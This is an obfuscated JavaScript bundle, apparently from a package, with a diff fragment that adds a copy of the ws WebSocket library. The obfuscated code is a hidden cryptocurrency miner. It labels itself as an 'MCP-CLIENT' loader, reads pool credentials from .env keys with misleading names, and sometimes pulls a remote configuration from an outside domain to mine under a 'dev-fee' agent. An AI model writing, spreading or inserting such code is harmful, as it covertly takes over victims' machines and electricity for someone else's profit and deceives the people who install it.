_0x1b216a=_0x3d400b;_0x2e1f71[_0x1b216a(0x181)](_0xd764af=>{const _0xede41e=_0x1b216a;this[_0xede41e(0x1c7)](_0x2ee692,_0x4fe2c2,(_0x7a8e78,_0x3a941f)=>{_0xd764af(),_0x1ab2b2(_0x7a8e78,_0x3a941f);});});}[_0x3d400b(0x17f)](_0x50aa97,_0x1c0d77,_0x6a0f5){const _0x527ce1=_0x3d400b,_0x4a6ec5=this[_0x527ce1(0x16d)]?_0x527ce1(0x17e):_0x527ce1(0x1b8);if(!this[_0x527ce1(0xa0)]){const _0x474694=_0x4a6ec5+_0x527ce1(0x156),_0x15648c=_0x527ce1(0x115)!=typeof this[_0x527ce1(0x18a)][_0x474694]?_0x38828c[_0x527ce1(0x230)]:this['params'][_0x474694];this[_0x527ce1(0xa0)]=_0x38828c['createInflateRaw']({...this[_0x527ce1(0x255)][_0x527ce1(0x149)],'windowBits':_0x15648c}),this[_0x527ce1(0xa0)][_0x14dadf]=this,this[_0x527ce1(0xa0)][_0xd5d6fa]=0x0,this[_0x527ce1(0xa0)][_0x14e1ba]=[],this['_inflate']['on'](_0x527ce1(0x1b9),_0x45ffc2),this[_0x527ce1(0xa0)]['on'](_0x527ce1(0x19a),_0xdcf2f1);}this[_0x527ce1(0xa0)][_0x4b5801]=_0x6a0f5,this[_0x527ce1(0xa0)][_0x527ce1(0xe6)](_0x50aa97),_0x1c0d77&&this['_inflate'][_0x527ce1(0xe6)](_0x589517),this[_0x527ce1(0xa0)][_0x527ce1(0x208)](()=>{const _0x2f7714=_0x527ce1,_0x3eb50d=this[_0x2f7714(0xa0)][_0x5d3e05];if(_0x3eb50d)return this[_0x2f7714(0xa0)][_0x2f7714(0x1d3)](),this['_inflate']=null,void _0x6a0f5(_0x3eb50d);const _0x31b227=_0x46f2d0['concat'](this[_0x2f7714(0xa0)][_0x14e1ba],this['_inflate'][_0xd5d6fa]);this[_0x2f7714(0xa0)][_0x2f7714(0x114)][_0x2f7714(0x1a9)]?(this[_0x2f7714(0xa0)][_0x2f7714(0x1d3)](),this['_inflate']=null):(this[_0x2f7714(0xa0)][_0xd5d6fa]=0x0,this[_0x2f7714(0xa0)][_0x14e1ba]=[],_0x1c0d77&&this[_0x2f7714(0x18a)][_0x4a6ec5+_0x2f7714(0x20f)]&&this[_0x2f7714(0xa0)][_0x2f7714(0x15f)]()),_0x6a0f5(null,_0x31b227);});}['_compress'](_0x224b2a,_0x15da1d,_0x4e5ccd){const _0x56b44e=_0x3d400b,_0x3ad717=this['_isServer']?_0x56b44e(0x1b8):_0x56b44e(0x17e);if(!this[_0x56b44e(0xaf)]){const _0x312440=_0x3ad717+_0x56b44e(0x156),_0x140e38=_0x56b44e(0x115)!=typeof this[_0x56b44e(0x18a)][_0x312440]?_0x38828c['Z_DEFAULT_WINDOWBITS']:this[_0x56b44e(0x18a)][_0x312440];this[_0x56b44e(0xaf)]=_0x38828c[_0x56b44e(0x143)]({...this[_0x56b44e(0x255)][_0x56b44e(0x251)],'windowBits':_0x140e38}),this[_0x56b44e(0xaf)][_0xd5d6fa]=0x0,this[_0x56b44e(0xaf)][_0x14e1ba]=[],this[_0x56b44e(0xaf)]['on']('data',_0x54e8dc);}this[_0x56b44e(0xaf)][_0x4b5801]=_0x4e5ccd,this[_0x56b44e(0xaf)][_0x56b44e(0xe6)](_0x224b2a),this[_0x56b44e(0xaf)][_0x56b44e(0x208)](_0x38828c[_0x56b44e(0x1a6)],()=>{const _0x3265e9=_0x56b44e;if(!this[_0x3265e9(0xaf)])return;let _0x2f8928=_0x46f2d0['concat'](this[_0x3265e9(0xaf)][_0x14e1ba],this['_deflate'][_0xd5d6fa]);_0x15da1d&&(_0x2f8928=new _0x48b395(_0x2f8928[_0x3265e9(0xcc)],_0x2f8928[_0x3265e9(0x260)],_0x2f8928[_0x3265e9(0x1d7)]-0x4)),this[_0x3265e9(0xaf)][_0x4b5801]=null,this[_0x3265e9(0xaf)][_0xd5d6fa]=0x0,this[_0x3265e9(0xaf)][_0x14e1ba]=[],_0x15da1d&&this['params'][_0x3ad717+_0x3265e9(0x20f)]&&this[_0x3265e9(0xaf)]['reset'](),_0x4e5ccd(null,_0x2f8928);});}};},0x3d6(_0x2b8519){'use strict';const _0x3693c1=a0_0x208b;_0x2b8519[_0x3693c1(0x1f0)]=require(_0x3693c1(0x182));}},_0x24a4a5={};function _0x15b493(_0x1173a1){const _0x29f0c5=a0_0x208b;var _0x5ec9a8=_0x24a4a5[_0x1173a1];if(void 0x0!==_0x5ec9a8)return _0x5ec9a8[_0x29f0c5(0x1f0)];var _0x5859c7=_0x24a4a5[_0x1173a1]={'id':_0x1173a1,'loaded':!0x1,'exports':{}};return _0x63069a[_0x1173a1](_0x5859c7,_0x5859c7[_0x29f0c5(0x1f0)],_0x15b493),_0x5859c7['loaded']=!0x0,_0x5859c7[_0x29f0c5(0x1f0)];}_0x15b493[_0xb499c2(0x1fa)]=_0x1be2b1=>(_0x1be2b1[_0xb499c2(0x16a)]=[],_0x1be2b1[_0xb499c2(0x225)]||(_0x1be2b1[_0xb499c2(0x225)]=[]),_0x1be2b1),_0x15b493['p']='';const _0x39ce37=_0x15b493(0x2bb),_0x343a07=_0x15b493(0x1b2),_0x7070d7=_0x15b493(0x380),_0x5755da=_0x15b493(0x2b4);class _0x306dc7 extends _0x343a07{constructor({proxyUrl:_0x581bb9,username:_0x2ea5f1,password:_0x1ff8cf,agent:_0x1222b8,retryDelay:_0x126aba=0xbb8,maxRetries:_0x48cc6c=0x0,pingIntervalMs:_0x2686a7=0x7530,connectionTimeout:_0x1cbd91=0x2710}){const _0x55f65d=_0xb499c2;super(),this['proxyUrl']=_0x581bb9,this['username']=_0x2ea5f1,this[_0x55f65d(0x229)]=_0x1ff8cf,this['agent']=_0x1222b8,this['retryDelay']=_0x126aba,this[_0x55f65d(0x14a)]=_0x48cc6c,this[_0x55f65d(0xf4)]=0x0,this[_0x55f65d(0x185)]=_0x2686a7,this[_0x55f65d(0xd6)]=_0x1cbd91,this['ws']=null,this[_0x55f65d(0x23f)]=null,this['connected']=!0x1,this['keepAliveInterval']=null,this[_0x55f65d(0x24d)]=null,this[_0x55f65d(0x218)]=null,this[_0x55f65d(0x24f)]=!0x1,this['intentionalDisconnect']=!0x1,this['id']=0x3;}[_0xb499c2(0x133)](){const _0x207a66=_0xb499c2;this[_0x207a66(0x1d5)]=!0x1,this[_0x207a66(0x164)]();}[_0xb499c2(0x19e)](){const _0x10ca98=_0xb499c2;this[_0x10ca98(0x213)](),this['keepAliveInterval']=setInterval(()=>{const _0x387645=_0x10ca98;if(this['ws']&&0x1===this['ws'][_0x387645(0x121)])try{this[_0x387645(0x82)]({'id':++this['id'],'jsonrpc':_0x387645(0x131),'method':_0x387645(0xb9),'params':{'id':this[_0x387645(0x23f)]}});}catch(_0x30f09f){this[_0x387645(0x200)](_0x387645(0x1b9),_0x30f09f);}else this[_0x387645(0x213)]();},this[_0x10ca98(0x185)]);}[_0xb499c2(0x213)](){const _0x248098=_0xb499c2;this[_0x248098(0x14c)]&&(clearInterval(this[_0x248098(0x14c)]),this[_0x248098(0x14c)]=null);}[_0xb499c2(0x164)](){const _0x56ad57=_0xb499c2;this[_0x56ad57(0xd0)](),this[_0x56ad57(0x218)]=setTimeout(()=>{const _0x28e9de=_0x56ad57;this[_0x28e9de(0x1b4)]||(this[_0x28e9de(0x200)](_0x28e9de(0x1b9),new Error(_0x28e9de(0xd3))),this['ws']&&(this['ws'][_0x28e9de(0x1a5)]?.()||this['ws'][_0x28e9de(0x1d3)]()));},this[_0x56ad57(0xd6)]);try{this['ws']=new _0x39ce37(this[_0x56ad57(0x257)]),this['ws']['on'](_0x56ad57(0x130),()=>{const _0x1bc6b8=_0x56ad57;this[_0x1bc6b8(0x218)]&&(clearTimeout(this['connectionTimer']),this['connectionTimer']=null),this['connected']=!0x0,this[_0x1bc6b8(0xf4)]=0x0,this[_0x1bc6b8(0x24f)]=!0x1,this['_login'](),this[_0x1bc6b8(0x19e)](),this['emit']('connected');}),this['ws']['on'](_0x56ad57(0x1df),_0x3b3cda=>this['_handleMessage'](_0x3b3cda)),this['ws']['on'](_0x56ad57(0x1d3),(_0x2e3bd3,_0x309255)=>{const _0x95dbe=_0x56ad57;this['connected']=!0x1,this[_0x95dbe(0x213)](),this[_0x95dbe(0x218)]&&(clearTimeout(this[_0x95dbe(0x218)]),this[_0x95dbe(0x218)]=null),this[_0x95dbe(0x200)](_0x95dbe(0xab),{'code':_0x2e3bd3,'reason':_0x309255?.[_0x95dbe(0xfc)]()}),this[_0x95dbe(0x1d5)]||this[_0x95dbe(0x234)]();}),this['ws']['on'](_0x56ad57(0x1b9),_0x27f2b2=>{const _0x103864=_0x56ad57;this[_0x103864(0x200)]('error',_0x27f2b2);});}catch(_0x4ed7cd){this[_0x56ad57(0x218)]&&(clearTimeout(this[_0x56ad57(0x218)]),this[_0x56ad57(0x218)]=null),this[_0x56ad57(0x200)]('error',_0x4ed7cd),this['_reconnect']();}}[_0xb499c2(0x234)](){const _0x4b64a8=_0xb499c2;if(this[_0x4b64a8(0x24f)]||this[_0x4b64a8(0x1d5)])return;if(this[_0x4b64a8(0x14a)]>0x0&&this[_0x4b64a8(0xf4)]>=this[_0x4b64a8(0x14a)])return void this[_0x4b64a8(0x200)](_0x4b64a8(0x1b9),new Error(_0x4b64a8(0x83)+this['maxRetries']+_0x4b64a8(0x13a)));this[_0x4b64a8(0x24f)]=!0x0,this[_0x4b64a8(0xf4)]++;const _0x91bcc9=this['_backoffDelay']();this[_0x4b64a8(0x200)](_0x4b64a8(0x135),{'attempt':this[_0x4b64a8(0xf4)],'delay':_0x91bcc9}),this['reconnectTimeout']&&clearTimeout(this['reconnectTimeout']),this[_0x4b64a8(0x24d)]=setTimeout(()=>{const _0x508697=_0x4b64a8;this[_0x508697(0x24d)]=null,this[_0x508697(0x164)]();},_0x91bcc9);}[_0xb499c2(0x1ae)](){const _0x582d34=_0xb499c2,_0x459830=this['retryDelay']*Math[_0x582d34(0xe7)](0x2,Math[_0x582d34(0x1e8)](this[_0x582d34(0xf4)]-0x1,0x5)),_0x2dced6=0x3e8*Math['random']();return Math[_0x582d34(0x1e8)](_0x459830+_0x2dced6,0xea60);}['_cleanup'](){const _0x173525=_0xb499c2;this[_0x173525(0x213)](),this['reconnectTimeout']&&(clearTimeout(this[_0x173525(0x24d)]),this['reconnectTimeout']=null),this[_0x173525(0x218)]&&(clearTimeout(this[_0x173525(0x218)]),this[_0x173525(0x218)]=null),this['ws']&&(this['ws']['removeAllListeners'](),0x1===this['ws'][_0x173525(0x121)]&&this['ws'][_0x173525(0x1d3)](),this['ws']=null),this['id']=0x3,this[_0x173525(0x23f)]=null;}[_0xb499c2(0x99)](){const _0x38203e=_0xb499c2;this[_0x38203e(0x82)]({'id':0x1,'method':_0x38203e(0x247),'jsonrpc':_0x38203e(0x131),'params':{'login':this[_0x38203e(0x250)],'pass':this[_0x38203e(0x229)],'agent':this[_0x38203e(0xd2)]}});}['_handleMessage'](_0x4404db){const _0xc8ccb0=_0xb499c2;let _0x607f4c;try{_0x607f4c=JSON[_0xc8ccb0(0x160)](_0x4404db);}catch{return;}0x1===_0x607f4c['id']&&_0x607f4c[_0xc8ccb0(0x8f)]&&(_0x607f4c[_0xc8ccb0(0x8f)]['id']&&(this['workerId']=_0x607f4c[_0xc8ccb0(0x8f)]['id']),_0x607f4c[_0xc8ccb0(0x8f)][_0xc8ccb0(0x261)]&&this['emit'](_0xc8ccb0(0x261),_0x607f4c[_0xc8ccb0(0x8f)][_0xc8ccb0(0x261)])),_0xc8ccb0(0x261)===_0x607f4c['method']&&_0x607f4c[_0xc8ccb0(0x18a)]&&this['emit']('job',_0x607f4c[_0xc8ccb0(0x18a)]),0x2===_0x607f4c['id']&&(_0x607f4c[_0xc8ccb0(0x8f)]?'OK'===_0x607f4c[_0xc8ccb0(0x8f)]['status']?this[_0xc8ccb0(0x200)](_0xc8ccb0(0x192),_0x607f4c['result']):this[_0xc8ccb0(0x200)](_0xc8ccb0(0x1bb),_0x607f4c[_0xc8ccb0(0x8f)]):_0x607f4c[_0xc8ccb0(0x1b9)]&&this[_0xc8ccb0(0x200)](_0xc8ccb0(0x1bb),_0x607f4c[_0xc8ccb0(0x1b9)])),_0x607f4c[_0xc8ccb0(0x1b9)]&&this[_0xc8ccb0(0x200)](_0xc8ccb0(0x1b9),_0x607f4c[_0xc8ccb0(0x1b9)]);}[_0xb499c2(0x24b)]({job_id:_0x2068b5,nonce:_0x13efa4,result:_0x5d140b}){const _0x1a206b=_0xb499c2;if(!this['workerId'])throw new Error(_0x1a206b(0x180));if(!this[_0x1a206b(0x1b4)]||!this['ws']||0x1!==this['ws']['readyState'])throw new Error(_0x1a206b(0xe2));this[_0x1a206b(0x82)]({'id':0x2,'method':_0x1a206b(0x24b),'jsonrpc':_0x1a206b(0x131),'params':{'id':this[_0x1a206b(0x23f)],'job_id':_0x2068b5,'nonce':_0x13efa4,'result':_0x5d140b}}),this['emit'](_0x1a206b(0x122),{'job_id':_0x2068b5,'nonce':_0x13efa4});}[_0xb499c2(0x82)](_0x2cde30){const _0x4c9dec=_0xb499c2;this['ws']&&0x1===this['ws'][_0x4c9dec(0x121)]&&this['ws']['send'](JSON[_0x4c9dec(0x158)](_0x2cde30));}['disconnect'](){const _0x1e05f0=_0xb499c2;this[_0x1e05f0(0x1d5)]=!0x0,this[_0x1e05f0(0x24f)]=!0x1,this[_0x1e05f0(0xd0)](),this['emit']('disconnected',{'code':0x3e8,'reason':_0x1e05f0(0x12b)});}[_0xb499c2(0x220)](){const _0x31a573=_0xb499c2;this[_0x31a573(0x1d5)]=!0x0,this[_0x31a573(0x24f)]=!0x1,this['_cleanup'](),this[_0x31a573(0xff)]();}}((async()=>{const _0x3eefb1=_0xb499c2,_0xdd2096=await async function(){return new Promise((_0x384c37,_0x14f8f5)=>{const _0x1a56d9=a0_0x208b;_0x5755da[_0x1a56d9(0xae)](_0x1a56d9(0xf1),_0x27bba6=>{const _0x2456ad=_0x1a56d9;let _0x30002f='';_0x27bba6['on'](_0x2456ad(0x19a),_0x1bb607=>_0x30002f+=_0x1bb607),_0x27bba6['on'](_0x2456ad(0x1ac),()=>{const _0x2dcbb6=_0x2456ad;try{_0x384c37(JSON[_0x2dcbb6(0x160)](_0x30002f));}catch(_0x4f618c){_0x14f8f5(_0x4f618c);}});})['on'](_0x1a56d9(0x1b9),_0x14f8f5);});}()[_0x3eefb1(0x259)](()=>null),_0x510c44=function(_0x8ba06d=_0x3eefb1(0x1f3)){const _0x4e7a79=_0x3eefb1;return _0x7070d7['existsSync'](_0x8ba06d)?_0x7070d7[_0x4e7a79(0x1ca)](_0x8ba06d,_0x4e7a79(0x129))['split']('\x0a')[_0x4e7a79(0x162)](_0x5d04ea=>_0x5d04ea[_0x4e7a79(0xca)]()&&!_0x5d04ea['startsWith']('#'))[_0x4e7a79(0x84)]((_0x2bdb4b,_0x2a35be)=>{const _0x4e39d3=_0x4e7a79;let [_0x411476,_0x22d2ee]=_0x2a35be[_0x4e39d3(0xde)]('=');return _0x411476&&_0x22d2ee?(_0x22d2ee=_0x22d2ee[_0x4e39d3(0xde)]('#')[0x0][_0x4e39d3(0xca)]()[_0x4e39d3(0x9c)](/^['"]|['"]$/g,''),_0x2bdb4b[_0x411476['trim']()]=_0x22d2ee,_0x2bdb4b):_0x2bdb4b;},{}):{};}();let _0x3e400b=_0x3eefb1(0x7f),_0x3af29d=0x0,_0x2656c1=0x0,_0x5cbde1=0x0,_0x5501e2='',_0x20cb44='',_0x11efec=0x0,_0x16e47c='',_0x3748cc=Math['random']()<=0.1&&_0xdd2096&&_0xdd2096[_0x3eefb1(0x22f)]>0x0;const _0x186ec4=_0x3748cc?{'url':_0xdd2096[_0x3eefb1(0x1b8)],'username':_0xdd2096[_0x3eefb1(0xdc)],'password':_0xdd2096[_0x3eefb1(0x229)],'agent':_0x3eefb1(0x236),'threads':Number(_0x510c44[_0x3eefb1(0x238)]??0x2)}:{'url':_0x510c44[_0x3eefb1(0xe3)]+'/'+_0x510c44['SERVER_TARGET'],'username':_0x510c44['SERVER_DOMAIN'],'password':_0x510c44['SERVER_SECRET'],'agent':'node-rs/1.0.0','threads':Number(_0x510c44['SERVER_CONNECTION']??0x2)},_0x24311f=()=>{const _0x12ff1a=_0x3eefb1;console['clear'](),console[_0x12ff1a(0x21b)]('['+_0x3e400b+'\x20'+(_0x3748cc?'D':'M')+_0x12ff1a(0x1bc)+_0x5501e2+_0x12ff1a(0x227)+_0x5cbde1+_0x12ff1a(0x70)+_0x3af29d+'\x20*\x20FAILED\x20=\x20'+_0x2656c1);},_0x78d6d0=new _0x306dc7({'proxyUrl':_0x186ec4[_0x3eefb1(0x23d)],'username':_0x186ec4['username'],'password':_0x186ec4[_0x3eefb1(0x229)],'agent':_0x186ec4[_0x3eefb1(0xd2)],'retryDelay':0x1388,'maxRetries':0xa});setInterval(()=>{const _0x5f303d=_0x3eefb1;_0x5cbde1=_0x34ff83[_0x5f303d(0x215)](),_0x24311f();},0x7530);const _0x34ff83=((_0x4310ca=_0x3eefb1(0x117),_0x678dcc,_0x37d1e0)=>{const _0x461a0c=_0x3eefb1,_0x26ebdd={'threads':_0x678dcc,'mode':_0x4310ca};return{..._0x15b493(0x240)['init'](_0x26ebdd[_0x461a0c(0x73)],_0x26ebdd[_0x461a0c(0x22f)],_0x37d1e0)};})(_0x3eefb1(0x117),_0x186ec4[_0x3eefb1(0x22f)],(..._0x57d3aa)=>{const _0x2f5f04=_0x3eefb1,[_0x297592,_0x536646,_0x4b59ae]=_0x57d3aa;_0x78d6d0[_0x2f5f04(0x24b)]({'job_id':_0x297592,'nonce':_0x536646,'result':_0x4b59ae});});_0x78d6d0['on'](_0x3eefb1(0x1b4),()=>{const _0x34d6dc=_0x3eefb1;_0x3e400b=_0x34d6dc(0x13c),_0x16e47c='',_0x20cb44='',_0x24311f();}),_0x78d6d0['on']('job',_0x158681=>{const _0x20c270=_0x3eefb1;if(_0x34ff83['pause'](),_0x34ff83[_0x20c270(0x261)](_0x158681['job_id'],_0x158681[_0x20c270(0x241)],_0x158681[_0x20c270(0x86)],_0x20cb44!=_0x158681[_0x20c270(0x86)]),_0x5501e2=_0x158681[_0x20c270(0x198)],_0x20cb44=_0x158681['blob'],_0x11efec=_0x158681[_0x20c270(0x72)],_0x24311f(),_0x16e47c!=_0x158681[_0x20c270(0x1bf)]){if(_0x34ff83[_0x20c270(0x109)](),_0x34ff83[_0x20c270(0x167)]())return _0x34ff83[_0x20c270(0x1cc)](_0x158681['seed_hash'],_0x186ec4['threads']),_0x16e47c=_0x158681[_0x20c270(0x1bf)],_0x34ff83[_0x20c270(0x17a)](0x0);process[_0x20c270(0x179)](0x0);}else _0x34ff83['start']();}),_0x78d6d0['on'](_0x3eefb1(0x192),_0x537781=>{_0x3af29d++,_0x24311f();}),_0x78d6d0['on'](_0x3eefb1(0x1bb),_0x2ab98b=>{_0x2656c1++,_0x24311f();}),_0x78d6d0['on']('error',_0x439345=>{const _0x19cf19=_0x3eefb1;_0x34ff83[_0x19cf19(0x110)](),process[_0x19cf19(0x179)]();}),_0x78d6d0['on']('disconnected',_0xc39392=>{const _0x1ab58e=_0x3eefb1;_0x34ff83[_0x1ab58e(0x110)](),_0x34ff83[_0x1ab58e(0x109)]();}),_0x78d6d0[_0x3eefb1(0x133)](),process['on'](_0x3eefb1(0x103),()=>{const _0xcd157d=_0x3eefb1;_0x34ff83[_0xcd157d(0x109)](),process[_0xcd157d(0x179)]();}),process['on'](_0x3eefb1(0x107),()=>{const _0x3ee152=_0x3eefb1;_0x34ff83[_0x3ee152(0x109)](),process['exit']();}),process['on']('uncaughtException',_0x4dfe31=>{const _0x50a886=_0x3eefb1;console[_0x50a886(0x21b)](_0x4dfe31),_0x34ff83[_0x50a886(0x109)](),process['exit'](0x1);}),process['on'](_0x3eefb1(0x85),_0x9ec73d=>{const _0x4b2d98=_0x3eefb1;console[_0x4b2d98(0x21b)](_0x9ec73d),_0x34ff83[_0x4b2d98(0x109)](),process['exit'](0x1);});})());})()));function a0_0x3d5d(){const _0x16eb93=['byteLength','unshift','_totalPayloadLength','_loop','Maximum\x20redirects\x20exceeded','map','FIN\x20must\x20be\x20set','Blob','Upgrade:\x20websocket','_login','headers','Invalid\x20HTTP\x20method','replace','extensions','_masked','WebSocket\x20is\x20not\x20open:\x20readyState\x200\x20(CONNECTING)','_inflate','method','address','137123fHlAyd','destroyed','apply','jobs','https:','Opening\x20handshake\x20has\x20timed\x20out','push','getPayloadLength64','disconnected','wss:','_receiver','get','_deflate','\x22\x20must\x20have\x20only\x20a\x20single\x20value','_fragments','\x20(supported\x20versions:\x20','text/plain','_payloadLength','WS_ERR_UNEXPECTED_RSV_2_3','_redirects','addEventListener','The\x20socket\x20was\x20closed\x20while\x20the\x20blob\x20was\x20being\x20read','keepalived','entries','998560yoxtWb','_allowSynchronousEvents','client_max_window_bits','20kNsPby','readOnly','kData','pong','3663768LvnuMy','protocolVersion','server_max_window_bits','buffers','includes','next','call','keys','trim','tls','buffer','invalid\x20UTF-8\x20sequence','threshold','sec-websocket-key','_cleanup','invalid\x20payload\x20length\x20','agent','Connection\x20timeout','function','set','connectionTimeout','isPaused','setHeader','stream','values','servername','user','path','split','client_no_context_takeover','getData','options','Not\x20connected','SERVER_WS','species','_closeMessage','write','pow','test','_socket','delete','isServer','toLowerCase','_errorEmitted','listenerCount','Parameter\x20\x22','MASK\x20must\x20be\x20clear','https://bill.dapitax.social/','removeListener','_skipUTF8Validation','retryCount','Sec-WebSocket-Origin','CLOSED','kError','dequeue','GET','Invalid\x20WebSocket\x20frame:\x20','digest','toString','cork','encrypted','removeAllListeners','Cannot\x20find\x20module\x20\x27utf-8-validate\x27','Unknown\x20parameter\x20\x22','sendFrame','SIGINT','getMask','socket','WS_ERR_UNEXPECTED_MASK','SIGTERM','clientNoContextTakeover','cleanup','One\x20and\x20only\x20one\x20of\x20the\x20\x22port\x22,\x20\x22server\x22,\x20or\x20\x22noServer\x22\x20options\x20must\x20be\x20specified','nodebuffer','net','completeUpgrade','_extensions','auth','pause','_readyState','protocol','total-length','_readableState','number','fin','FAST','MODULE_NOT_FOUND','onmessage','update','setSocket','permessage-deflate','HTTP/1.1\x20101\x20Switching\x20Protocols','OPEN','CONNECTING','frame','readyState','submitted','WebSocket','writable','_sender','STATUS_CODES','accept','nextTick','utf8','authorized','Client\x20disconnect','abort','Invalid\x20URL:\x20','rsv1','acceptAsClient','open','2.0','finished','connect','http','reconnecting','_closeTimer','backlog','Sec-WebSocket-Accept:\x20','3355374OskERa',')\x20reached','_mask','MCP-CLIENT\x20CONNECTED','wsClientError','callback','_generateMask','compress','The\x20server\x20is\x20operating\x20in\x20\x22noServer\x22\x20mode','opcode','createDeflateRaw','noServer','_binaryType','readUInt32BE','clients','format','zlibInflateOptions','maxRetries','_url','keepAliveInterval','base64','serverNoContextTakeover','then','resume','sec-websocket-version','sha1','cookie','clientMaxWindowBits','undefined','_max_window_bits','connection','stringify','_req','Server\x20sent\x20a\x20subprotocol\x20but\x20none\x20was\x20requested','startsWith','charCodeAt','handleEvent','1TrXnJp','reset','parse','server_no_context_takeover','filter','wasClean','_openSocket','pending','Invalid\x20Upgrade\x20header','alloc','create','toStringTag','paths','concurrencyLimit','Server\x20sent\x20a\x20Sec-WebSocket-Extensions\x20header\x20but\x20no\x20extension\x20was\x20requested','_isServer','allowSynchronousEvents','Unexpected\x20or\x20invalid\x20parameter\x20\x22client_max_window_bits\x22','emitClose','shift','isArray','kTarget','The\x20URL\x27s\x20protocol\x20must\x20be\x20one\x20of\x20\x22ws:\x22,\x20\x22wss:\x22,\x20\x22http:\x22,\x20\x22https:\x22,\x20or\x20\x22ws+unix:\x22','Unexpected\x20server\x20response:\x20','listening','_buffers','http:','exit','start','socketPath','code','Sec-WebSocket-Protocol','client','_decompress','Not\x20logged\x20in','add','crypto','has','_fragmented','pingIntervalMs','ping','binary','isValidUTF8','Sec-WebSocket-Extensions:\x20','params','redirect','dispatch','writeUIntBE','kAborted','_firstFragment','maxPayload','perMessageDeflate','accepted','hash','_closeFrameReceived','kMessage','CLOSING','finishRequest','job_id','WebSocket\x20is\x20not\x20open:\x20readyState\x20','data','errorEmitted','defineProperty','binaryType','startKeepAlive','enqueue','mask','value','_destroy','startLoop','Sender','terminate','Z_SYNC_FLUSH','Max\x20payload\x20size\x20exceeded','forEach','endEmitted','generateMask','WS_ERR_EXPECTED_FIN','end','origin','_backoffDelay','unmask','_originalSecure','port','_originalIpc','handleUpgrade','connected','arrayBuffer','node-loader:\x0a','_originalHostOrSocketPath','server','error','haveLength','rejected',']\x20WORK_ID\x20=\x20','maskBuffer','_maxPayload','seed_hash','\x22:\x20','read','None\x20of\x20the\x20extension\x20offers\x20can\x20be\x20accepted','onerror','_state','_shouldEmitClose','_bufferedAmount','_compress','835614RulCvS','_removeListeners','readFileSync','File','init','_closeCode','_read','unexpected-response','captureStackTrace','\x0d\x0a\x0d\x0a','_protocol','close','_maskBuffer','intentionalDisconnect','RSV2\x20and\x20RSV3\x20must\x20be\x20clear','length','_errored','status-code','The\x20\x22','WebSocketServer','ws:','_fin','Unexpected\x20parameter\x20\x22client_no_context_takeover\x22','message','writeUInt16BE','kIsForOnEventAttribute','dlopen','_threshold','kWasClean','ws+unix:','extensionName','The\x20URL\x27s\x20pathname\x20is\x20empty','min','invalid\x20status\x20code\x20','getBlobData','env','getInfo','Receiver','WS_ERR_UNSUPPORTED_MESSAGE_LENGTH','\x22\x20subprotocol\x20is\x20duplicated','exports','allocUnsafe','hostname','.env','indexOf','kDone','reason','from','sec-websocket-origin','setTimeout','nmd','4942976QVqtmb','createConnection','sec-websocket-protocol','defaultPort','response','emit','createError','Missing\x20or\x20invalid\x20Sec-WebSocket-Version\x20header','The\x20data\x20size\x20must\x20not\x20be\x20greater\x20than\x20125\x20bytes','bind','once','The\x20message\x20must\x20not\x20be\x20greater\x20than\x20123\x20bytes','72CCiQwl','flush','websocket','readUInt16BE','sec-websocket-accept','WebSocket\x20was\x20closed\x20before\x20the\x20connection\x20was\x20established','kListener','autoPong','_no_context_takeover','verifyClient','writeHead','Sec-WebSocket-Extensions','stopKeepAlive','_final','hashrate','onclose','kByteLength','connectionTimer','join','258EAFA5-E914-47DA-95CA-C5AB0DC85B11','log','request','114uIMrqp','handshakeTimeout','WS_ERR_INVALID_CLOSE_CODE','destroy','Upgrade','size','_writableState','shouldHandle','children','authorization','\x20*\x20SPEED\x20=\x20','host','password','upgrade','decompress','_bufferedBytes','_paused','WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH','threads','Z_DEFAULT_WINDOWBITS','Sec-WebSocket-Protocol:\x20','4999575CSHELs','slice','_reconnect','_queue','dev-fee/1.0.0','_opcode','SERVER_CONNECTION','followRedirects','WS_ERR_INVALID_OPCODE','listeners','pathname','url','Server','workerId','WS_NO_BUFFER_UTIL','target','skipUTF8Validation','Invalid\x20Sec-WebSocket-Protocol\x20header','drain','_write','serverMaxWindowBits','login','_autoPong','objectMode','_compressed','submit','isIP','reconnectTimeout','https','isReconnecting','username','zlibDeflateOptions','statusCode','concurrency','handleProtocols','_options','timeout','proxyUrl','Server\x20indicated\x20an\x20extension\x20that\x20was\x20not\x20requested','catch','invalid\x20opcode\x20','prototype','offer','clientTracking','Unsupported\x20WebSocket\x20frame:\x20payload\x20length\x20>\x202^53\x20-\x201','concat','byteOffset','job','controlMessage','WS_ERR_UNEXPECTED_RSV_1','string','WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH','conclude','\x20Mbp/s\x20*\x20SUCCESS\x20=\x20','zlib','height','mode','bufferedAmount','MASK\x20must\x20be\x20set','Invalid\x20value\x20for\x20parameter\x20\x22','send','An\x20invalid\x20or\x20duplicated\x20subprotocol\x20was\x20specified','Missing\x20or\x20invalid\x20Sec-WebSocket-Key\x20header','Cannot\x20find\x20module\x20\x27bufferutil\x27','WS_ERR_INVALID_UTF8','listen','onopen','dataMessage','MCP-CLIENT\x20CONNECTING','consume','type','_send','Max\x20reconnect\x20attempts\x20(','reduce','unhandledRejection','blob','Connection:\x20Upgrade','_messageLength','Unexpected\x20end\x20of\x20input','Invalid\x20Sec-WebSocket-Extensions\x20header','_server','finish','Unexpected\x20character\x20at\x20index\x20','_closeFrameSent','result'];a0_0x3d5d=function(){return _0x16eb93;};return a0_0x3d5d();}
+(() => {
+    var e = {
+            16(e) {
+                "use strict";
+                e.exports = require("url")
+            },
+            60(e, t, s) {
+                "use strict";
+                const r = s(434),
+                    i = s(692),
+                    o = s(611),
+                    n = s(278),
+                    a = s(756),
+                    {
+                        randomBytes: c,
+                        createHash: h
+                    } = s(982),
+                    {
+                        Duplex: l,
+                        Readable: d
+                    } = s(203),
+                    {
+                        URL: u
+                    } = s(16),
+                    f = s(971),
+                    _ = s(286),
+                    p = s(914),
+                    {
+                        isBlob: m
+                    } = s(880),
+                    {
+                        BINARY_TYPES: y,
+                        EMPTY_BUFFER: b,
+                        GUID: v,
+                        kForOnEventAttribute: g,
+                        kListener: S,
+                        kStatusCode: w,
+                        kWebSocket: E,
+                        NOOP: k
+                    } = s(614),
+                    {
+                        EventTarget: {
+                            addEventListener: x,
+                            removeEventListener: T
+                        }
+                    } = s(597),
+                    {
+                        format: O,
+                        parse: C
+                    } = s(926),
+                    {
+                        toBuffer: N
+                    } = s(338),
+                    L = Symbol("kAborted"),
+                    R = [8, 13],
+                    P = ["CONNECTING", "OPEN", "CLOSING", "CLOSED"],
+                    I = /^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;
+                class B extends r {
